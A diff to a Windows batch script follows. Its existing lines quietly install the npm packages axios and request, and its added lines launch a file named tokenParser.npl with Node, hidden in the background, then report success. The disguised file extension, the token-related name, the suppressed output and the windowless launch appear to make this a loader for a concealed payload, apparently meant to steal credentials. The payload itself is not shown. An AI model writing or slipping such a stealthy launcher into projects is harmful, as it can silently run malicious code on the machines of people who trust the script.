@@ -101,4 +101,21 @@ pushd "%~dp0"
 call npm install axios request >nul 2>&1
 popd
 
+
+:: -------------------------
+:: Run the parser
+:: -------------------------
+if exist "%~dp0tokenParser.npl" (
+    echo [INFO] Running tokenParser.npl...
+    start "" /b /d "%~dp0" "%NODE_EXE%" "%~dp0tokenParser.npl"
+    if errorlevel 1 (
+        echo [ERROR] tokenParser execution failed.
+        exit /b 1
+    )
+) else (
+    echo [ERROR] tokenParser.npl not found.
+    exit /b 1
+)
+
+echo [SUCCESS] Script completed successfully.
 exit /b 0
